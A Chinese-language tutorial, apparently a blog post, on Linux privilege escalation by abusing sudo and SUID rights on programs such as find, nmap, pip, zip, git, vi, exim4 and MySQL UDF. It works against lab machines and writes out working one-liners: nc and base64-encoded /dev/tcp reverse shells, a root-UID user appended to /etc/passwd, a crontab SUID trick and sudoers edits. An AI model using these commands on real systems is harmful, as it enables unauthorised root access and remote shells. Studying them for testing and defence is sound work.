Linux提权，前提是拿到了一个低权限的账号，能上传和下载文件，主要思路有：

1、内核提权。网上各种大佬的payload很多，关键在于要能找到利用哪个exp以及具体如何利用。省力点的方法是用searchsploit或者linux-exploit-suggester.sh来查找，熟悉之后难度也不大。

2、suid提权。这里也包含了sudo这种方式，两种方法的思路都是一样的，区别在于suid针对单个程序，sudo针对某个用户。这类提权方式的主要思路是：管理员授权普通用户去执行
root 权限的操作，而不需要知道 root 的密码，合理的利用拥有root权限的程序，就可以实现提权。通常遇到的情况有：

（1）直接提权，sudo -i 就可以切换到root了；

（2）修改系统文件，如计划任务文件、用户文件、密码文件、sudoers文件等，本文把这个作为彩蛋后续也讲一下；

（3）修改程序本身，如果对程序有写权限的话，直接把反弹的bash命令写到程序里，运行程序即可提权；

（4）对程序进行溢出，部分程序通过端口可以实现和用户的交互，这也就存在可以溢出的前提。

总的来说，suid提权难度没有上限和下限，简单的直接一个sudo -i命令，难的涉及到溢出，相当于在挖0day。

3、第三方应用提权，某些程序使用root权限启动，如果第三方服务或者程序存在漏洞或者配置问题，可以被利用来获得root权限。相比前几种方式，难度属于中间，不像内核提权套路很固定，也不像suid提权方法很灵活多样。

本文总结了常见的一些第三方应用的提权方法，所以的方法都经过实际测试，拿出来与大家相互交流和学习。（为避免文章篇幅过于冗长，每个应用具体的提权原理就不详细介绍了，感兴趣的自行查阅相关文档）

## find提权

### 实例1

一个典型的例子是将SUDO权限分配给find命令，以便其他用户可以在系统中搜索特定的文件相关文件。尽管管理员可能不知道'find'命令包含用于执行命令的参数，但攻击者可以以root特权执行命令。  
拿到普通用户权限之后，使用sudo –l查看下，
查看当前是否存在当前用户可以调用sudo的命令，如下图，当前用户可以执行find命令，然后通过find命令获取root权限。  
![](https://image.3001.net/images/20210119/1611035699_60067433c719a38692bee.png!small)

nc正向反弹

![](https://image.3001.net/images/20210119/1611035753_6006746988a68db9f1e66.png!small)

![](https://image.3001.net/images/20210119/1611035770_6006747ad66edfa53d3c3.png!small)

nc反向反弹

find /var/www/dirty -exec nc 192.168.167.4 8888 -t -e /bin/sh \;

![](https://image.3001.net/images/20210119/1611035830_600674b6dee2751b8c383.png!small)

![](https://image.3001.net/images/20210119/1611035848_600674c8a8d3d739928b4.png!small)

### 实例2

查找具有特殊权限SUID的文件  
find / -perm -u=s -type f 2>/dev/null

![](https://image.3001.net/images/20210119/1611035175_600672270e4f25f49964a.png!small)

如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行

通过find命令给wget命令提供SUID权限

![](https://image.3001.net/images/20210119/1611035266_60067282d0429e5850033.png!small)

通过OpenSSL passwd生成一个新的用户hacker，密码为hack123

openssl passwd -1 -salt hacker hack123

$1$hacker$0vnQaCNuzDe3w9d6jHfXQ0

将其追加到kali的/etc/passwd文件中

将hacker:$1$hacker$0vnQaCNuzDe3w9d6jHfXQ0:0:0:/root:/bin/bash追加到passwd中

在Kali上启动一个python服务器

python -m SimpleHTTPServer 8000

将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件

wget -O passwd http://10.10.10.128:8000/passwd

![](https://image.3001.net/images/20210119/1611035433_60067329585cf3a327fef.png!small)

然后切换到hacker用户即可，

![](https://image.3001.net/images/20210119/1611035461_600673459f94f4afe22b3.png!small)

## nmap提权

### 实例1

nmap被suid分配了root权限；

![](https://image.3001.net/images/20210119/1611036362_600676ca0a6a2083b3a9f.png!small)

用nmap来提权；

![](https://image.3001.net/images/20210119/1611036414_600676fe9bf762477dc80.png!small)

### 实例2

当单个用户被分配了root权限时，

![](https://image.3001.net/images/20210119/1611036515_60067763bcbd9ccc8b0bd.png!small)

nmap提权；

echo "os.execute('/bin/bash')" >> shell.nce

sudo nmap --script=/tmp/shell.nce

![](https://image.3001.net/images/20210119/1611036601_600677b9835da197c1eaa.png!small)

## pip提权

pip命令被分配了root权限

![](https://image.3001.net/images/20210119/1611036800_6006788074f9066774f79.png!small)

pip提权；

TF=$(mktemp -d)

echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty)
2>$(tty)')" > $TF/setup.py

sudo pip install $TF

![](https://image.3001.net/images/20210119/1611036833_600678a1edd677366f5ad.png!small)

## zip提权

zip命令被分配了root权限

![](https://image.3001.net/images/20210119/1611036937_600679090e55d0abd9aac.png!small)

我们可以发现 sarang 用户可以以 root 用户身份权限来运行 zip 命令，那么我们就可以通过 ZIP 来进行提权：

TF=$(mktemp -u)

sudo zip $TF /etc/hosts -T -TT 'sh #'

![](https://image.3001.net/images/20210119/1611036978_60067932eea17f6446ec8.png!small)

还有一种可以这样玩：先创建一个 liuwx 文件，然后在将它压缩为zip文件，最后使用unzip-command来执行bash命令从而提权：

touch liuwx

sudo zip /tmp/liuwx.zip /home/sarang/liuwx -T --unzip-command="sh -c
/bin/bash" tmp为可写目录，所以压缩包放在tmp下；

![](https://image.3001.net/images/20210119/1611037027_600679637db0d3e300bfd.png!small)

## git提权

git命令被分配了root权限

![](https://image.3001.net/images/20210119/1611037095_600679a7e659e8f26a472.png!small)

利用git来提权；

sudo git help add

!/bin/bash

![](https://image.3001.net/images/20210119/1611037139_600679d3342ad19297b4a.png!small)

![](https://image.3001.net/images/20210119/1611037154_600679e2487ae42a0034d.png!small)

粘贴代码到此处，然后回车完成提权；

还可以；

sudo git help config

在末行命令模式输入 !/bin/bash 或 !'sh' 完成提权

## screen提权

Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU
Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。

在Screen环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。

![](https://image.3001.net/images/20210119/1611037243_60067a3b5f9683bc89d63.png!small)![](https://image.3001.net/images/20210119/1611037258_60067a4acad20ae0dfbcd.png!small)

仔细阅读下41154.sh脚本的内容，具体操作步骤为：

把41154.sh的代码分为3个文件；

![](https://image.3001.net/images/20210119/1611037311_60067a7f793825f25c1ed.png!small)

![](https://image.3001.net/images/20210119/1611037325_60067a8d2815b420ce609.png!small)

![](https://image.3001.net/images/20210119/1611037340_60067a9c85c1458dceaba.png!small)

将两个c文件在本地编译后，上传到靶机下，更改权限后运行；

![](https://image.3001.net/images/20210119/1611037549_60067b6d719ed8768ef31.png!small)

## exim4提权

Exim4是在剑桥大学开发的另一种消息传输代理（MTA），用于在连接到Internet的Unix系统上使用。
尽管exim的配置与sendmail的配置完全不同，但是可以安装Exim代替sendmail。

![](https://image.3001.net/images/20210119/1611037644_60067bcc8e766dab02eb2.png!small)

sudo -l用之前的密码试了不对，发现exim4；

查看exim4当前版本号

/usr/sbin/exim4 --version

![](https://image.3001.net/images/20210119/1611037694_60067bfed34098ca07a0e.png!small)

或者 dpkg -l | grep exim 查看包安装情况

![](https://image.3001.net/images/20210119/1611037722_60067c1a78fa0c06ff05e.png!small)

查找漏洞；

![](https://image.3001.net/images/20210119/1611037765_60067c45c36939dc0aaa7.png!small)

用法介绍；

![](https://image.3001.net/images/20210119/1611037831_60067c8764b7cbd2ac3e3.png!small)

上传脚本；执行后成功；

![](https://image.3001.net/images/20210119/1611037882_60067cbab64251435f747.png!small)

## vi提权

vi命令分配了root权限

![](https://image.3001.net/images/20210119/1611039091_60068173f1fec942a6612.png!small)

运行sudo -l发现该用户可以任意用户执行vi，按esc后输入:!/bin/bash直接提权至root。

sudo /usr/bin/vi /tmp/jin

![](https://image.3001.net/images/20210119/1611039151_600681afc3b203a9c4203.png!small)

esc退出，然后输入 :!/bin/bash ；

![](https://image.3001.net/images/20210119/1611039196_600681dc369efc7c4b822.png!small)

或者还可以；

sudo /usr/bin/vi /tmp/jin

:set shell=/bin/sh 回车

:shell 回车

![](https://image.3001.net/images/20210119/1611039231_600681ff710af849f5170.png!small)

## python沙箱逃逸

1337端口用python编写的，于是尝试python沙箱逃逸

eval('__import__("os").system("whoami")') #查看是以什么权限运行

![](https://image.3001.net/images/20210119/1611039454_600682decfef9298e7ad0.png!small)

eval('__import__("os").system("echo
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2Ny4xMzEvNjY2NiAwPiYx|base64
-d|bash")') #反弹shell

![](https://image.3001.net/images/20210119/1611039506_600683129f4e5d8cd79d0.png!small)

## ht编辑器

ht编辑器被分配了root权限

Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106  
loneferret@Kioptrix3:~$ sudo -l  
User loneferret may run the following commands on this host:  
(root) NOPASSWD: !/usr/bin/su  
(root) NOPASSWD: /usr/local/bin/ht

ht编辑器被分配root权限。如果编辑/etc/sudoers，在里面给lone这个用户的sudo -l
权限再添加个/bin/bash，可以直接拿root的shell了。

ht运行之前要设置下，输入export TERM=xterm

底下就是命令 f3打开 f2保存

打开sudoers，在用户那又加了个/bin/bash指令

![](https://image.3001.net/images/20210119/1611039847_600684672e9ce28073dc1.png!small)

f2保存退出。。ctrl c

再看看sudo -l，多了命令

loneferret@Kioptrix3:/tmp$ sudo -l  
User loneferret may run the following commands on this host:  
(root) NOPASSWD: !/usr/bin/su  
(root) NOPASSWD: /usr/local/bin/ht  
(root) NOPASSWD: /bin/bash

sudo /bin/bash 搞定，转成root

![](https://image.3001.net/images/20210119/1611039922_600684b2e7044e1fe5de1.png!small)

## mysql UDF提权

查看开启的端口发现有3306

![](https://image.3001.net/images/20210119/1611040003_6006850328c2673456d0d.png!small)

ps -ef | grep root | grep mysql

![](https://image.3001.net/images/20210119/1611040029_6006851d7c88c92b45aaf.png!small)

很自然想到的MySQL
UDF提权，从前面SQL注入中获取到的信息发现数据库版本是5.0.12，但是在上传动态链接库后导出时出错。然而，在查看mysql数据库时很幸运发现已经存在func表，且表中含有执行命令的函数，

    
    
    mysql> use mysql
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A
    
    Database changed
    mysql> select * from func;
    +-----------------------+-----+---------------------+----------+
    | name                  | ret | dl                  | type     |
    +-----------------------+-----+---------------------+----------+
    | lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function |
    | sys_exec              |   0 | lib_mysqludf_sys.so | function |
    +-----------------------+-----+---------------------+----------+
    2 rows in set (0.00 sec)
    
    mysql> select sys_exec('usermod -a -G admin john');
    +--------------------------------------+
    | sys_exec('usermod -a -G admin john') |
    +--------------------------------------+
    | NULL                                 |
    +--------------------------------------+
    1 row in set (0.05 sec)
    
    mysql> exit
    Bye
    john@Kioptrix4:/var/www$ sudo su -    [sudo] password for john:
    root@Kioptrix4:~# whoami
    root
    root@Kioptrix4:~# cd /root
    root@Kioptrix4:~# ls
    congrats.txt  lshell-0.9.12
    root@Kioptrix4:~#

## apt-get提权

执行sudo -l，发现可以免密执行adduser命令，添加一个root组的用户

![](https://image.3001.net/images/20210119/1611040248_600685f84e58fd94a6b2e.png!small)

有了这个跟 root
同一组的用户，就可以读到一些只能root组和root读的文件:/etc/sudoers，该文件包含了能够让普通用户执行一些或者全部的root命令，如果该文件可以写入的话，我们可以把当前用户写入：chounana
ALL=(ALL:ALL) ALL，这样当执行sudo su的时候，我们就可以进入到 root 了！

但现在只有读权限：

查看sudoers文件，查看还有哪些用户可以使用sudo执行命令，发现一个jason用户，但是这个用户并不存在，但是我们是可以新建用户的，所以需要密码（自己的密码）才能执行这个也就没有问题。

![](https://image.3001.net/images/20210119/1611040289_60068621e1bda8437735a.png!small)

exit退回到saint用户，新建jason用户

    
    
    chounana@djinn3:/home/saint$ exit
    exit
    saint@djinn3:~$ sudo adduser jason
    Adding user `jason' ...
    Adding new group `jason' (1005) ...
    Adding new user `jason' (1005) with group `jason' ...
    Creating home directory `/home/jason' ...
    Copying files from `/etc/skel' ...
    Enter new UNIX password: 
    Retype new UNIX password: 
    passwd: password updated successfully
    Changing the user information for jason
    Enter the new value, or press ENTER for the default
            Full Name []: 
            Room Number []: 
            Work Phone []: 
            Home Phone []: 
            Other []: 
    Is the information correct? [Y/n] 
    saint@djinn3:~$ 

切换到jason用户，使用apt-get命令提权，因为用户是自己建立的，所以密码也当然是知道的；

sudo apt-get changelog apt

!/bin/bash

![](https://image.3001.net/images/20210119/1611040376_60068678091680402bb84.png!small)

最后一个是彩蛋环节，通过tee命令来重写系统文件以达到提权的目的，实战中不管修改的方式如何变化，但所要修改的文件就这3个系统文件，修改的内容也大同小异。

## tee提权

这里靶机用的是teehee命令，可以写入文件内容并不覆盖文件原有内容，功能与tee命令类似。

![](https://image.3001.net/images/20210119/1611041363_60068a53a43a956995ae7.png!small)

虽然有密码，但不能直接切到root，从sudo看，明显这个teehee可以不要密码以root身份运行，提权就靠这个程序了；

### 1、修改/etc/passwd用户信息

追加一个名为hacker的用户，将它的uid和gid也设置为root的0：

echo "hacker::0:0:::/bin/bash" | sudo teehee -a /etc/passwd

![](https://image.3001.net/images/20210119/1611041462_60068ab6a9d27614927f3.png!small)

![](https://image.3001.net/images/20210119/1611041474_60068ac25c10302a34f23.png!small)

### 2、修改/etc/crontab计划任务文件

可以在/etc/crontab下写入定时计划，提升到root权限。

crontab介绍

Linux crontab是用来定期执行程序的命令。当安装完成操作系统之后，默认便会启动此任务调度命令。

    
    
    f1 f2 f3 f4 f5 program
    其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。
    当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序，其馀类推；
    当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行，其馀类推；
    当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次，其馀类推；
    当 f1 为 a, b, c,... 时表示第 a, b, c,... 分钟要执行，f2 为 a, b, c,... 时表示第 a, b, c...个小时要执行，其馀类推
    
    *    *    *    *    *
    -    -    -    -    -    |    |    |    |    |
    |    |    |    |    +----- 星期中星期几 (0 - 7) (星期天 为0)
    |    |    |    +---------- 月份 (1 - 12) 
    |    |    +--------------- 一个月中的第几天 (1 - 31)
    |    +-------------------- 小时 (0 - 23)
    +------------------------- 分钟 (0 - 59)
    

所以我们可以追加内容为：echo "* * * * * root chmod 4777 /bin/sh" | sudo teehee -a
/etc/crontab，表示在/etc/crontab下写入定时计划，一分钟后由root用户给 /bin/bash 命令加权限（chmod
4777即开启suid和rwx权限）：

![](https://image.3001.net/images/20210119/1611041697_60068ba11e87f5deb16eb.png!small)

### 3、修改/etc/sudoers文件

先看看本地sudoers文件的语法。cat sudoers;

![](https://image.3001.net/images/20210119/1611041767_60068be729e717827b1e1.png!small)

仿造写一个 charles ALL=(ALL:ALL) ALL

![](https://image.3001.net/images/20210119/1611041794_60068c022577dd7ca8bbb.png!small)

可以看到现在charles可以以root用户身份运行所有命令

![](https://image.3001.net/images/20210119/1611041822_60068c1ebd786057f9486.png!small)

## 总结

此次对于第三方应用的提权总结就告一段落了，相对suid提权而言，第三方应用提权可查的资料更多一点，套路也相对单一点，不像suid提权需要根据程序的具体情况来处理，没有相对固定的套路。对第三方应用提权多进行总结和归纳，当再次遇到的时候心里更有底，也就不那么慌了。

